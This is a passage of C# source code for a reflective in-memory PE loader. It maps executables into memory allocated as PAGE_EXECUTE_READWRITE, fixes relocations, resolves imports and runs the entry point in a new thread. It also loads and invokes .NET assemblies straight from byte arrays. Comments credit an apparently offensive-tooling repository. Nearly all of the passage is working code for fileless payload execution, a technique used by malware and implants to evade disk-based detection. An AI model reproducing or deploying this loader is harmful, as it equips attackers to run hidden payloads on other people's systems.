                //Console.WriteLine("Allocated Space For {0} at {1}", pe.OptionalHeader64.SizeOfImage.ToString("X4"), codebase.ToString("X4"));

                //Copy Sections
                for (int i = 0; i < pe.FileHeader.NumberOfSections; i++)
                {

                    IntPtr y = NativeDeclarations.VirtualAlloc(IntPtr.Add(codebase, (int)pe.ImageSectionHeaders[i].VirtualAddress), pe.ImageSectionHeaders[i].SizeOfRawData, NativeDeclarations.MEM_COMMIT, NativeDeclarations.PAGE_EXECUTE_READWRITE);
                    Marshal.Copy(pe.RawBytes, (int)pe.ImageSectionHeaders[i].PointerToRawData, y, (int)pe.ImageSectionHeaders[i].SizeOfRawData);
                    //Console.WriteLine("Section {0}, Copied To {1}", new string(pe.ImageSectionHeaders[i].Name), y.ToString("X4"));
                }

                //Perform Base Relocation
                //Calculate Delta
                long currentbase = (long)codebase.ToInt64();
                long delta;

                delta = (long)(currentbase - (long)pe.OptionalHeader64.ImageBase);

                //Console.WriteLine("Delta = {0}", delta.ToString("X4"));

                //Modify Memory Based On Relocation Table

                //Console.WriteLine(pe.OptionalHeader64.BaseRelocationTable.VirtualAddress.ToString("X4"));
                //Console.WriteLine(pe.OptionalHeader64.BaseRelocationTable.Size.ToString("X4"));

                IntPtr relocationTable = (IntPtr.Add(codebase, (int)pe.OptionalHeader64.BaseRelocationTable.VirtualAddress));
                //Console.WriteLine(relocationTable.ToString("X4"));

                NativeDeclarations.IMAGE_BASE_RELOCATION relocationEntry = new NativeDeclarations.IMAGE_BASE_RELOCATION();
                relocationEntry = (NativeDeclarations.IMAGE_BASE_RELOCATION)Marshal.PtrToStructure(relocationTable, typeof(NativeDeclarations.IMAGE_BASE_RELOCATION));
                //Console.WriteLine(relocationEntry.VirtualAdress.ToString("X4"));
                //Console.WriteLine(relocationEntry.SizeOfBlock.ToString("X4"));

                int imageSizeOfBaseRelocation = Marshal.SizeOf(typeof(NativeDeclarations.IMAGE_BASE_RELOCATION));
                IntPtr nextEntry = relocationTable;
                int sizeofNextBlock = (int)relocationEntry.SizeOfBlock;
                IntPtr offset = relocationTable;

                while (true)
                {

                    NativeDeclarations.IMAGE_BASE_RELOCATION relocationNextEntry = new NativeDeclarations.IMAGE_BASE_RELOCATION();
                    IntPtr x = IntPtr.Add(relocationTable, sizeofNextBlock);
                    relocationNextEntry = (NativeDeclarations.IMAGE_BASE_RELOCATION)Marshal.PtrToStructure(x, typeof(NativeDeclarations.IMAGE_BASE_RELOCATION));


                    IntPtr dest = IntPtr.Add(codebase, (int)relocationEntry.VirtualAddress);


                    //Console.WriteLine("Section Has {0} Entires",(int)(relocationEntry.SizeOfBlock - imageSizeOfBaseRelocation) /2);
                    //Console.WriteLine("Next Section Has {0} Entires", (int)(relocationNextEntry.SizeOfBlock - imageSizeOfBaseRelocation) / 2);

                    for (int i = 0; i < (int)((relocationEntry.SizeOfBlock - imageSizeOfBaseRelocation) / 2); i++)
                    {

                        IntPtr patchAddr;
                        UInt16 value = (UInt16)Marshal.ReadInt16(offset, 8 + (2 * i));

                        UInt16 type = (UInt16)(value >> 12);
                        UInt16 fixup = (UInt16)(value & 0xfff);
                        //Console.WriteLine("{0}, {1}, {2}", value.ToString("X4"), type.ToString("X4"), fixup.ToString("X4"));

                        switch (type)
                        {
                            case 0x0:
                                break;
                            case 0xA:
                                patchAddr = IntPtr.Add(dest, fixup);
                                //Add Delta To Location.
                                long originalAddr = Marshal.ReadInt64(patchAddr);
                                Marshal.WriteInt64(patchAddr, originalAddr + delta);
                                break;

                        }

                    }

                    offset = IntPtr.Add(relocationTable, sizeofNextBlock);
                    sizeofNextBlock += (int)relocationNextEntry.SizeOfBlock;
                    relocationEntry = relocationNextEntry;

                    nextEntry = IntPtr.Add(nextEntry, sizeofNextBlock);

                    if (relocationNextEntry.SizeOfBlock == 0) break;


                }


                //Resolve Imports

                IntPtr z = IntPtr.Add(codebase, (int)pe.ImageSectionHeaders[1].VirtualAddress);
                IntPtr oa1 = IntPtr.Add(codebase, (int)pe.OptionalHeader64.ImportTable.VirtualAddress);
                int oa2 = Marshal.ReadInt32(IntPtr.Add(oa1, 16));

                //Get And Display Each DLL To Load
                for (int j = 0; j < 999; j++) //HardCoded Number of DLL's Do this Dynamically.
                {
                    IntPtr a1 = IntPtr.Add(codebase, (20 * j) + (int)pe.OptionalHeader64.ImportTable.VirtualAddress);
                    int entryLength = Marshal.ReadInt32(IntPtr.Add(a1, 16));
                    IntPtr a2 = IntPtr.Add(codebase, (int)pe.ImageSectionHeaders[1].VirtualAddress + (entryLength - oa2)); //Need just last part? 
                    IntPtr dllNamePTR = (IntPtr)(IntPtr.Add(codebase, +Marshal.ReadInt32(IntPtr.Add(a1, 12))));
                    string DllName = Marshal.PtrToStringAnsi(dllNamePTR);
                    if (DllName == "") { break; }

                    IntPtr handle = NativeDeclarations.LoadLibrary(DllName);
                    //Console.WriteLine("Loaded {0}", DllName);
                    for (int k = 1; k < 9999; k++)
                    {
                        IntPtr dllFuncNamePTR = (IntPtr.Add(codebase, +Marshal.ReadInt32(a2)));
                        string DllFuncName = Marshal.PtrToStringAnsi(IntPtr.Add(dllFuncNamePTR, 2));
                        //Console.WriteLine("Function {0}", DllFuncName);
                        IntPtr funcAddy = NativeDeclarations.GetProcAddress(handle, DllFuncName);
                        Marshal.WriteInt64(a2, (long)funcAddy);
                        a2 = IntPtr.Add(a2, 8);
                        if (DllFuncName == "") break;

                    }
                    //Console.ReadLine();
                }

                //Transfer Control To OEP
                //Console.WriteLine("Executing loaded PE");
                IntPtr threadStart = IntPtr.Add(codebase, (int)pe.OptionalHeader64.AddressOfEntryPoint);
                IntPtr hThread = NativeDeclarations.CreateThread(IntPtr.Zero, 0, threadStart, IntPtr.Zero, 0, IntPtr.Zero);
                NativeDeclarations.WaitForSingleObject(hThread, 0xFFFFFFFF);

                //Console.WriteLine("Thread Complete");

                nCode = 1;
            }
            catch (AccessViolationException ex)
            {
                szMsg = ex.Message;
            }
            catch (Exception ex)
            {
                szMsg = ex.Message;
            }

            return (nCode, szMsg);
        }

        public (int nCode, string szMsg) fnLoadDotNetDll(byte[] abDllByte, string szTypeName, string szMethodName)
        {
            int nCode = 0;
            string szMsg = string.Empty;

            try
            {
                Assembly asm = Assembly.Load(abDllByte);
                Type type = asm.GetType(szTypeName);
                MethodInfo method = type.GetMethod(szMethodName);

                object obj = Activator.CreateInstance(type);
                method.Invoke(obj, null);

                nCode = 1;
            }
            catch (Exception ex)
            {
                szMsg = ex.Message;
            }

            return (nCode, szMsg);
        }

        public (int nCode, string szMsg) fnLoadDotNetExe(byte[] abBuffer, string[] args)
        {
            int nCode = 0;
            string szMsg = string.Empty;

            try
            {
                Assembly asm = Assembly.Load(abBuffer);
                MethodInfo entry = asm.EntryPoint;

                object[] para = entry.GetParameters().Length == 0 ? null : new object[] { args };

                entry.Invoke(null, para);

                nCode = 1;
            }
            catch (Exception ex)
            {
                szMsg = ex.Message;
            }

            return (nCode, szMsg);
        }

        #endregion

        public class x86PELoader
        {
            [StructLayout(LayoutKind.Sequential)]
            struct IMAGE_BASE_RELOCATION
            {
                public uint VirtualAddress;
                public uint SizeOfBlock;
            }

            [StructLayout(LayoutKind.Sequential)]
            struct IMAGE_IMPORT_DESCRIPTOR
            {
                public uint OriginalFirstThunk;
                public uint TimeDateStamp;
                public uint ForwarderChain;
                public uint Name;
                public uint FirstThunk;
            }

            [StructLayout(LayoutKind.Sequential, Pack = 1)]
            public struct IMAGE_OPTIONAL_HEADER32
            {
                public UInt16 Magic;
                public Byte MajorLinkerVersion;
                public Byte MinorLinkerVersion;
                public UInt32 SizeOfCode;
                public UInt32 SizeOfInitializedData;
                public UInt32 SizeOfUninitializedData;
                public UInt32 AddressOfEntryPoint;
                public UInt32 BaseOfCode;
                public UInt32 BaseOfData;
                public UInt32 ImageBase;
                public UInt32 SectionAlignment;
                public UInt32 FileAlignment;
                public UInt16 MajorOperatingSystemVersion;
                public UInt16 MinorOperatingSystemVersion;
                public UInt16 MajorImageVersion;
                public UInt16 MinorImageVersion;
                public UInt16 MajorSubsystemVersion;
                public UInt16 MinorSubsystemVersion;
                public UInt32 Win32VersionValue;
                public UInt32 SizeOfImage;
                public UInt32 SizeOfHeaders;
                public UInt32 CheckSum;
                public UInt16 Subsystem;
                public UInt16 DllCharacteristics;
                public UInt32 SizeOfStackReserve;
                public UInt32 SizeOfStackCommit;
                public UInt32 SizeOfHeapReserve;
                public UInt32 SizeOfHeapCommit;
                public UInt32 LoaderFlags;
                public UInt32 NumberOfRvaAndSizes;

                public IMAGE_DATA_DIRECTORY ExportTable;
                public IMAGE_DATA_DIRECTORY ImportTable;
                public IMAGE_DATA_DIRECTORY ResourceTable;
                public IMAGE_DATA_DIRECTORY ExceptionTable;
                public IMAGE_DATA_DIRECTORY CertificateTable;
                public IMAGE_DATA_DIRECTORY BaseRelocationTable;
                public IMAGE_DATA_DIRECTORY Debug;
                public IMAGE_DATA_DIRECTORY Architecture;
                public IMAGE_DATA_DIRECTORY GlobalPtr;
                public IMAGE_DATA_DIRECTORY TLSTable;
                public IMAGE_DATA_DIRECTORY LoadConfigTable;
                public IMAGE_DATA_DIRECTORY BoundImport;
                public IMAGE_DATA_DIRECTORY IAT;
                public IMAGE_DATA_DIRECTORY DelayImportDescriptor;
                public IMAGE_DATA_DIRECTORY CLRRuntimeHeader;
                public IMAGE_DATA_DIRECTORY Reserved;
            }

            [StructLayout(LayoutKind.Sequential)]
            public struct IMAGE_DATA_DIRECTORY
            {
                public UInt32 VirtualAddress;
                public UInt32 Size;
            }

            [StructLayout(LayoutKind.Explicit)]
            public struct IMAGE_SECTION_HEADER
            {
                [FieldOffset(0)]
                [MarshalAs(UnmanagedType.ByValArray, SizeConst = 8)]
                public char[] Name;
                [FieldOffset(8)]
                public UInt32 VirtualSize;
                [FieldOffset(12)]
                public UInt32 VirtualAddress;
                [FieldOffset(16)]
                public UInt32 SizeOfRawData;
                [FieldOffset(20)]
                public UInt32 PointerToRawData;
                [FieldOffset(24)]
                public UInt32 PointerToRelocations;
                [FieldOffset(28)]
                public UInt32 PointerToLinenumbers;
                [FieldOffset(32)]
                public UInt16 NumberOfRelocations;
                [FieldOffset(34)]
                public UInt16 NumberOfLinenumbers;
                [FieldOffset(36)]
                public DataSectionFlags Characteristics;

                public string Section
                {
                    get { return new string(Name); }
                }
            }

            [Flags]
            public enum DataSectionFlags : uint
            {

                Stub = 0x00000000,

            }

            [StructLayout(LayoutKind.Sequential, Pack = 1)]
            public struct IMAGE_FILE_HEADER
            {
                public UInt16 Machine;
                public UInt16 NumberOfSections;
                public UInt32 TimeDateStamp;
                public UInt32 PointerToSymbolTable;
                public UInt32 NumberOfSymbols;
                public UInt16 SizeOfOptionalHeader;
                public UInt16 Characteristics;
            }

            public IMAGE_OPTIONAL_HEADER32 OptionalHeader;
            public IMAGE_SECTION_HEADER[] Sections;
            public byte[] RawBytes;
            public bool Is32Bit => OptionalHeader.Magic == 0x10B;

            public x86PELoader(byte[] bytes)
            {
                RawBytes = bytes;
                using (var br = new BinaryReader(new MemoryStream(bytes)))
                {
                    br.ReadBytes(0x3C);
                    int ntOffset = br.ReadInt32();
                    br.BaseStream.Position = ntOffset + 4;

                    IMAGE_FILE_HEADER fh = Read<IMAGE_FILE_HEADER>(br);
                    OptionalHeader = Read<IMAGE_OPTIONAL_HEADER32>(br);

                    Sections = new IMAGE_SECTION_HEADER[fh.NumberOfSections];
                    for (int i = 0; i < Sections.Length; i++)
                        Sections[i] = Read<IMAGE_SECTION_HEADER>(br);
                }
            }

            static T Read<T>(BinaryReader br)
            {
                byte[] data = br.ReadBytes(Marshal.SizeOf<T>());
                GCHandle h = GCHandle.Alloc(data, GCHandleType.Pinned);
                T obj = Marshal.PtrToStructure<T>(h.AddrOfPinnedObject());
                h.Free();
                return obj;
            }
        }

        public class x64PELoader
        {
            /// <summary>
            /// Acknowledgement: https://github.com/S3cur3Th1sSh1t/Creds/blob/master/Csharp/PEloader.cs
            /// </summary>

            public struct IMAGE_DOS_HEADER
            {      //DOS .EXE header
                public UInt16 e_magic;              //Magic number
                public UInt16 e_cblp;               //Bytes on last page of file
                public UInt16 e_cp;                 //Pages in file
                public UInt16 e_crlc;               //Relocations
                public UInt16 e_cparhdr;            //Size of header in paragraphs
                public UInt16 e_minalloc;           //Minimum extra paragraphs needed
                public UInt16 e_maxalloc;           //Maximum extra paragraphs needed
                public UInt16 e_ss;                 //Initial (relative) SS value
                public UInt16 e_sp;                 //Initial SP value
                public UInt16 e_csum;               //Checksum
                public UInt16 e_ip;                 //Initial IP value
                public UInt16 e_cs;                 //Initial (relative) CS value
                public UInt16 e_lfarlc;             //File address of relocation table
                public UInt16 e_ovno;               //Overlay number
                public UInt16 e_res_0;              //Reserved words
                public UInt16 e_res_1;              //Reserved words
                public UInt16 e_res_2;              //Reserved words
                public UInt16 e_res_3;              //Reserved words
                public UInt16 e_oemid;              //OEM identifier (for e_oeminfo)
                public UInt16 e_oeminfo;            //OEM information; e_oemid specific
                public UInt16 e_res2_0;             //Reserved words
                public UInt16 e_res2_1;             //Reserved words
                public UInt16 e_res2_2;             //Reserved words
                public UInt16 e_res2_3;             //Reserved words
                public UInt16 e_res2_4;             //Reserved words
                public UInt16 e_res2_5;             //Reserved words
                public UInt16 e_res2_6;             //Reserved words
                public UInt16 e_res2_7;             //Reserved words
                public UInt16 e_res2_8;             //Reserved words
                public UInt16 e_res2_9;             //Reserved words
                public UInt32 e_lfanew;             //File address of new exe header
            }

            [StructLayout(LayoutKind.Sequential)]
            public struct IMAGE_DATA_DIRECTORY
            {
                public UInt32 VirtualAddress;
                public UInt32 Size;
            }

            [StructLayout(LayoutKind.Sequential, Pack = 1)]
            public struct IMAGE_OPTIONAL_HEADER32
            {
                public UInt16 Magic;
                public Byte MajorLinkerVersion;
                public Byte MinorLinkerVersion;
                public UInt32 SizeOfCode;
                public UInt32 SizeOfInitializedData;
                public UInt32 SizeOfUninitializedData;
                public UInt32 AddressOfEntryPoint;
                public UInt32 BaseOfCode;
                public UInt32 BaseOfData;
                public UInt32 ImageBase;
                public UInt32 SectionAlignment;
                public UInt32 FileAlignment;
                public UInt16 MajorOperatingSystemVersion;
                public UInt16 MinorOperatingSystemVersion;
                public UInt16 MajorImageVersion;
                public UInt16 MinorImageVersion;
                public UInt16 MajorSubsystemVersion;
                public UInt16 MinorSubsystemVersion;
                public UInt32 Win32VersionValue;
                public UInt32 SizeOfImage;
                public UInt32 SizeOfHeaders;
                public UInt32 CheckSum;
                public UInt16 Subsystem;
                public UInt16 DllCharacteristics;
                public UInt32 SizeOfStackReserve;
                public UInt32 SizeOfStackCommit;
                public UInt32 SizeOfHeapReserve;
                public UInt32 SizeOfHeapCommit;
                public UInt32 LoaderFlags;
                public UInt32 NumberOfRvaAndSizes;

                public IMAGE_DATA_DIRECTORY ExportTable;
                public IMAGE_DATA_DIRECTORY ImportTable;
                public IMAGE_DATA_DIRECTORY ResourceTable;
                public IMAGE_DATA_DIRECTORY ExceptionTable;
                public IMAGE_DATA_DIRECTORY CertificateTable;
                public IMAGE_DATA_DIRECTORY BaseRelocationTable;
                public IMAGE_DATA_DIRECTORY Debug;
                public IMAGE_DATA_DIRECTORY Architecture;
                public IMAGE_DATA_DIRECTORY GlobalPtr;
                public IMAGE_DATA_DIRECTORY TLSTable;
                public IMAGE_DATA_DIRECTORY LoadConfigTable;
                public IMAGE_DATA_DIRECTORY BoundImport;
                public IMAGE_DATA_DIRECTORY IAT;
                public IMAGE_DATA_DIRECTORY DelayImportDescriptor;
                public IMAGE_DATA_DIRECTORY CLRRuntimeHeader;
                public IMAGE_DATA_DIRECTORY Reserved;
            }

            [StructLayout(LayoutKind.Sequential, Pack = 1)]
            public struct IMAGE_OPTIONAL_HEADER64
            {
                public UInt16 Magic;
                public Byte MajorLinkerVersion;
                public Byte MinorLinkerVersion;
                public UInt32 SizeOfCode;
                public UInt32 SizeOfInitializedData;
                public UInt32 SizeOfUninitializedData;
                public UInt32 AddressOfEntryPoint;
                public UInt32 BaseOfCode;
                public UInt64 ImageBase;
                public UInt32 SectionAlignment;
                public UInt32 FileAlignment;
                public UInt16 MajorOperatingSystemVersion;
                public UInt16 MinorOperatingSystemVersion;
                public UInt16 MajorImageVersion;
                public UInt16 MinorImageVersion;
                public UInt16 MajorSubsystemVersion;
                public UInt16 MinorSubsystemVersion;
                public UInt32 Win32VersionValue;
                public UInt32 SizeOfImage;
                public UInt32 SizeOfHeaders;
                public UInt32 CheckSum;
                public UInt16 Subsystem;
                public UInt16 DllCharacteristics;
                public UInt64 SizeOfStackReserve;
                public UInt64 SizeOfStackCommit;
                public UInt64 SizeOfHeapReserve;
                public UInt64 SizeOfHeapCommit;
                public UInt32 LoaderFlags;
                public UInt32 NumberOfRvaAndSizes;

                public IMAGE_DATA_DIRECTORY ExportTable;
                public IMAGE_DATA_DIRECTORY ImportTable;
                public IMAGE_DATA_DIRECTORY ResourceTable;
                public IMAGE_DATA_DIRECTORY ExceptionTable;
                public IMAGE_DATA_DIRECTORY CertificateTable;
                public IMAGE_DATA_DIRECTORY BaseRelocationTable;
                public IMAGE_DATA_DIRECTORY Debug;
                public IMAGE_DATA_DIRECTORY Architecture;
                public IMAGE_DATA_DIRECTORY GlobalPtr;
                public IMAGE_DATA_DIRECTORY TLSTable;
                public IMAGE_DATA_DIRECTORY LoadConfigTable;
                public IMAGE_DATA_DIRECTORY BoundImport;
                public IMAGE_DATA_DIRECTORY IAT;
                public IMAGE_DATA_DIRECTORY DelayImportDescriptor;
                public IMAGE_DATA_DIRECTORY CLRRuntimeHeader;
                public IMAGE_DATA_DIRECTORY Reserved;
            }

            [StructLayout(LayoutKind.Sequential, Pack = 1)]
            public struct IMAGE_FILE_HEADER
            {
                public UInt16 Machine;
                public UInt16 NumberOfSections;
                public UInt32 TimeDateStamp;
                public UInt32 PointerToSymbolTable;
                public UInt32 NumberOfSymbols;
                public UInt16 SizeOfOptionalHeader;
                public UInt16 Characteristics;
            }

            [StructLayout(LayoutKind.Explicit)]
            public struct IMAGE_SECTION_HEADER
            {
                [FieldOffset(0)]
                [MarshalAs(UnmanagedType.ByValArray, SizeConst = 8)]
                public char[] Name;
                [FieldOffset(8)]
                public UInt32 VirtualSize;
                [FieldOffset(12)]
                public UInt32 VirtualAddress;
                [FieldOffset(16)]
                public UInt32 SizeOfRawData;
                [FieldOffset(20)]
                public UInt32 PointerToRawData;
                [FieldOffset(24)]
                public UInt32 PointerToRelocations;
                [FieldOffset(28)]
                public UInt32 PointerToLinenumbers;
                [FieldOffset(32)]
                public UInt16 NumberOfRelocations;
                [FieldOffset(34)]
                public UInt16 NumberOfLinenumbers;
                [FieldOffset(36)]
                public DataSectionFlags Characteristics;

                public string Section
                {
                    get { return new string(Name); }
                }
            }

            [StructLayout(LayoutKind.Sequential)]
            public struct IMAGE_BASE_RELOCATION
            {
                public uint VirtualAdress;
                public uint SizeOfBlock;
            }

            [Flags]
            public enum DataSectionFlags : uint
            {

                Stub = 0x00000000,

            }


            ///The DOS header
            private IMAGE_DOS_HEADER dosHeader;

            ///The file header
            private IMAGE_FILE_HEADER fileHeader;

            ///Optional 32 bit file header 
            private IMAGE_OPTIONAL_HEADER32 optionalHeader32;

            ///Optional 64 bit file header 
            private IMAGE_OPTIONAL_HEADER64 optionalHeader64;

            ///Image Section headers. Number of sections is in the file header.
            private IMAGE_SECTION_HEADER[] imageSectionHeaders;

            private byte[] rawbytes;

            public x64PELoader(string filePath)
            {
                //Read in the DLL or EXE and get the timestamp
                using (FileStream stream = new FileStream(filePath, System.IO.FileMode.Open, System.IO.FileAccess.Read))
                {
                    BinaryReader reader = new BinaryReader(stream);
                    dosHeader = FromBinaryReader<IMAGE_DOS_HEADER>(reader);

                    //Add 4 bytes to the offset
                    stream.Seek(dosHeader.e_lfanew, SeekOrigin.Begin);

                    UInt32 ntHeadersSignature = reader.ReadUInt32();
                    fileHeader = FromBinaryReader<IMAGE_FILE_HEADER>(reader);
                    if (this.Is32BitHeader)
                    {
                        optionalHeader32 = FromBinaryReader<IMAGE_OPTIONAL_HEADER32>(reader);
                    }
                    else
                    {
                        optionalHeader64 = FromBinaryReader<IMAGE_OPTIONAL_HEADER64>(reader);
                    }

                    imageSectionHeaders = new IMAGE_SECTION_HEADER[fileHeader.NumberOfSections];
                    for (int headerNo = 0; headerNo < imageSectionHeaders.Length; ++headerNo)
                    {
                        imageSectionHeaders[headerNo] = FromBinaryReader<IMAGE_SECTION_HEADER>(reader);
                    }

                    rawbytes = System.IO.File.ReadAllBytes(filePath);

                }
            }

            public x64PELoader(byte[] fileBytes)
            {
                //Read in the DLL or EXE and get the timestamp
                using (MemoryStream stream = new MemoryStream(fileBytes, 0, fileBytes.Length))
                {
                    BinaryReader reader = new BinaryReader(stream);
                    dosHeader = FromBinaryReader<IMAGE_DOS_HEADER>(reader);

                    //Add 4 bytes to the offset
                    stream.Seek(dosHeader.e_lfanew, SeekOrigin.Begin);

                    UInt32 ntHeadersSignature = reader.ReadUInt32();
                    fileHeader = FromBinaryReader<IMAGE_FILE_HEADER>(reader);
                    if (this.Is32BitHeader)
                    {
                        optionalHeader32 = FromBinaryReader<IMAGE_OPTIONAL_HEADER32>(reader);
                    }
                    else
                    {
                        optionalHeader64 = FromBinaryReader<IMAGE_OPTIONAL_HEADER64>(reader);
                    }

                    imageSectionHeaders = new IMAGE_SECTION_HEADER[fileHeader.NumberOfSections];
                    for (int headerNo = 0; headerNo < imageSectionHeaders.Length; ++headerNo)
                    {
                        imageSectionHeaders[headerNo] = FromBinaryReader<IMAGE_SECTION_HEADER>(reader);
                    }


                    rawbytes = fileBytes;

                }
            }


            public static T FromBinaryReader<T>(BinaryReader reader)
            {
                //Read in a byte array
                byte[] bytes = reader.ReadBytes(Marshal.SizeOf(typeof(T)));

                //Pin the managed memory while, copy it out the data, then unpin it
                GCHandle handle = GCHandle.Alloc(bytes, GCHandleType.Pinned);
                T theStructure = (T)Marshal.PtrToStructure(handle.AddrOfPinnedObject(), typeof(T));
                handle.Free();

                return theStructure;
            }



            public bool Is32BitHeader
            {
                get
                {
                    UInt16 IMAGE_FILE_32BIT_MACHINE = 0x0100;
                    return (IMAGE_FILE_32BIT_MACHINE & FileHeader.Characteristics) == IMAGE_FILE_32BIT_MACHINE;
                }
            }


            public IMAGE_FILE_HEADER FileHeader
            {
                get
                {
                    return fileHeader;
                }
            }


            ///Gets the optional header

            public IMAGE_OPTIONAL_HEADER32 OptionalHeader32
            {
                get
                {
                    return optionalHeader32;
                }
            }


            ///Gets the optional header

            public IMAGE_OPTIONAL_HEADER64 OptionalHeader64
            {
                get
                {
                    return optionalHeader64;
                }
            }

            public IMAGE_SECTION_HEADER[] ImageSectionHeaders
            {
                get
                {
                    return imageSectionHeaders;
                }
            }

            public byte[] RawBytes
            {
                get
                {
                    return rawbytes;
                }

            }

        }//End Class

        unsafe class NativeDeclarations
        {
            /// <summary>
            /// Acknowledgement: https://github.com/S3cur3Th1sSh1t/Creds/blob/master/Csharp/PEloader.cs
            /// </summary>

            public static uint MEM_COMMIT = 0x1000;
            public static uint MEM_RESERVE = 0x2000;
            public static uint PAGE_EXECUTE_READWRITE = 0x40;
            public static uint PAGE_READWRITE = 0x04;

            [StructLayout(LayoutKind.Sequential)]
            public unsafe struct IMAGE_BASE_RELOCATION
            {
                public uint VirtualAddress;
                public uint SizeOfBlock;
            }

            [DllImport("kernel32")]
            public static extern IntPtr VirtualAlloc(IntPtr lpStartAddr, uint size, uint flAllocationType, uint flProtect);

            [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Unicode)]
            public static extern IntPtr LoadLibrary(string lpFileName);

            [DllImport("kernel32.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
            public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);

            [DllImport("kernel32.dll", SetLastError = true)]
            public static extern IntPtr GetProcAddress(IntPtr hModule, IntPtr ordinal);

            [DllImport("kernel32")]
            public static extern IntPtr CreateThread(

              IntPtr lpThreadAttributes,
              uint dwStackSize,
              IntPtr lpStartAddress,
              IntPtr param,
              uint dwCreationFlags,
              IntPtr lpThreadId
              );

            [DllImport("kernel32")]
            public static extern UInt32 WaitForSingleObject(

              IntPtr hHandle,
              UInt32 dwMilliseconds
              );

            [StructLayout(LayoutKind.Sequential)]
            public unsafe struct IMAGE_IMPORT_DESCRIPTOR
            {
                public uint OriginalFirstThunk;
                public uint TimeDateStamp;
                public uint ForwarderChain;
                public uint Name;
                public uint FirstThunk;
            }


        }
    }
}
